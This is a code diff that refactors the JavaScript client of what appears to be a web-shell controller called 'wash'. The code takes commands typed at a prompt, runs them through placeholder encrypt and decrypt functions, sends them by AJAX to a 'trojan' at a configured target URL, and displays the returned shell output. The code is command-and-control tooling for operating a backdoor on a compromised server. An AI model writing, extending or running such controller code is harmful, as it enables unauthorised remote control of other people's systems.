@@ -7,71 +7,59 @@ var wash = {
 
     command: {
 
-        cmd: '',
-        obj: {},
-        response: {},
+        obj: new Command(),
 
+        // encrypts a command before sending to the trojan
         encrypt: function(){
-
-        },
-        decrypt: function(){
-
-        },
-        interpret: function(command){
-            // assemble a command object
-            var cmd = new Command();
-
-            // switch on the command mode
-            var mode = shell.prompt.mode.get();
-            switch(mode){
-                case 'wash':
-                    cmd.payload = command;
-                    break;
-                default:
-                    cmd.shell = command;
-                    // @todo: handle payload arguments here
-                    break;
-            }
-
-            // buffer the command object
-            wash.command.obj = cmd;
-
-            // @todo: need validation and such above, probably
             return true;
         },
 
-        output: function(){
-            //console.log(wash.command.response);
-            shell.prompt.context.set(wash.command.response.prompt_context);
-            shell.output.write(wash.command.response.output , 'output');
-            //console.log('output');
-            //console.log(wash.command.response);
+        // decrypts a command before sending to the trojan
+        decrypt: function(){
+            return true;
         },
 
+        // processes commands on the wash prompt
         process: function(command){
-            wash.command.interpret(command);
-            // might also want a package step to manage crypto
+            // build the command object
+            wash.command.obj.cmd  = command;
+            wash.command.obj.type = shell.prompt.mode.get();
+            // process wash command arguments if appropriate
+            if(wash.command.obj.type == 'wash'){
+                console.log('@todo: process arguments here');
+            }
+
+            // encrypt and send the command object
+            wash.command.encrypt();
             wash.command.send();
         },
 
+        // sends a command to the trojan
         send: function(){
-
-            console.log(wash.command.obj);
-
             // make the AJAX request to the trojan
             $.ajax({
                 type : wash.target.request_type,
                 url  : wash.target.protocol + '://' + wash.target.url,
                 data : wash.command.obj,
             }).done(function(response){
-                wash.command.response = JSON.parse(response);
-                console.log('deep');
-                console.log(wash.command.response);
+                wash.response.obj = JSON.parse(response);
                 // this has to go here rather than in command.process because
                 // it is a callback that will be processed asynchronously
-                wash.command.output();
+                wash.response.output();
             });
         }
+    },
+
+    response: {
+        // this is a buffer for the response from the trojan
+        obj: new Response(),
+
+        // outputs response data to the wash interface
+        output: function(){
+            //decrypt here
+            shell.prompt.context.set(wash.response.obj.prompt_context);
+            shell.output.write(wash.response.obj.output , 'output');
+        },
     },
 
     // target parameters
@@ -97,6 +85,11 @@ var wash = {
 
             // saves a connection under a new name
             saveas: function(){
+                console.log('TODO: implement this.');
+            },
+
+            // sets the connection parameters
+            set: function(){
                 console.log('TODO: implement this.');
             },
 
